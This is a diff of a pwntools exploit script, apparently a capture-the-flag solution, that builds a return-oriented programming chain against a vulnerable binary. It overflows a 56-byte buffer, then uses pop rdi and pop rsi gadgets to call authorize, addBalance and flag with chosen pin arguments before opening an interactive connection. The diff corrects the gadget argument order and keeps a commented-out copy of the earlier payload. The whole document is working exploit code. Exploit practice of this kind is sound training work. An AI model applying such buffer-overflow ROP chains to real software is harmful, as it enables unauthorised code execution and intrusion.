@@ -24,11 +24,14 @@ You need to understand calling convention to find the correct gadget to rebuild 
 x64 --> rdi, rsi, rdx, rcx, r8, r9
 x32 --> eax, ebx, ecx, edx, esi, edi, ebp
 https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64
+POP NEEDS TO EAT SOMETHING
+YOU CANT POP A POP
+ALSO FEED POP NO MATTER WHAT
 '''
 
 #set environment
 context.terminal = 'bash'
-context.log_level = 'debug'
+#context.log_level = 'debug'
 #context.arch = 'amd64'
 
 DEBUG = 0
@@ -68,21 +71,21 @@ pop_rdi_ret = 0x401403
 pop_rsi_r15_ret = 0x401401
 ret = 0x40101a
 pop_r14_pop_r15_ret = 0x0401400
+pop_r14_ret = 0x401402
 #+----------------------------------+
 
 #Create payload
 #+----------------------------------+
-
 payload = ''
 
 #add junk to fill stack and ebp
 payload += "A"*56
 
-#AUTHORIZE
+###AUTHORIZE
 #add address of authorize to rip                           
 payload += p64(authorize)
 
-#ADDBALANCE
+###ADDBALANCE
 #reform stack using pop ret
 payload += p64(pop_rdi_ret)
 #pass pin parameter
@@ -90,17 +93,21 @@ payload += p64(pin1)
 #call addBalance
 payload += p64(addBalance)
 
+
 #test that prev function calls worked --> IT WORKED
 #payload += p64(getInfo)
 
 #Put on hold to use the getInfo() function to determine if the variables are set correctly
-#FLAG
+
+###FLAG
 #two args gadget            
-payload += p64(pop_rdi_ret)                   #!!!!!!!!!!!!!!!!!
+payload += p64(pop_rdi_ret)  
+payload += p64(pin2)                   #!!!!!!!!!!!!!!!!!
 payload += p64(pop_rsi_r15_ret)                                   
 #pass parameters 
-payload += p64(pin2)                            
+                          
 payload += p64(secret)
+payload += p64(secret) #fill r15 with garbage
 #call flag
 payload += p64(flag)
 
@@ -117,3 +124,53 @@ conn.sendline(payload)
 
 conn.interactive()
 #+----------------------------------+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+'''saved incase i screw it up bad
+payload = ''
+
+#add junk to fill stack and ebp
+payload += "A"*56
+
+###AUTHORIZE
+#add address of authorize to rip                           
+payload += p64(authorize)
+
+###ADDBALANCE
+#reform stack using pop ret
+payload += p64(pop_rdi_ret)
+#pass pin parameter
+payload += p64(pin1)
+#call addBalance
+payload += p64(addBalance)
+
+#test that prev function calls worked --> IT WORKED
+#payload += p64(getInfo)
+
+#Put on hold to use the getInfo() function to determine if the variables are set correctly
+
+###FLAG
+#two args gadget            
+payload += p64(pop_rdi_ret)                   #!!!!!!!!!!!!!!!!!
+payload += p64(pop_r14_ret)                                   
+#pass parameters 
+payload += p64(pin2)                            
+payload += p64(secret)
+#call flag
+payload += p64(flag)
+'''
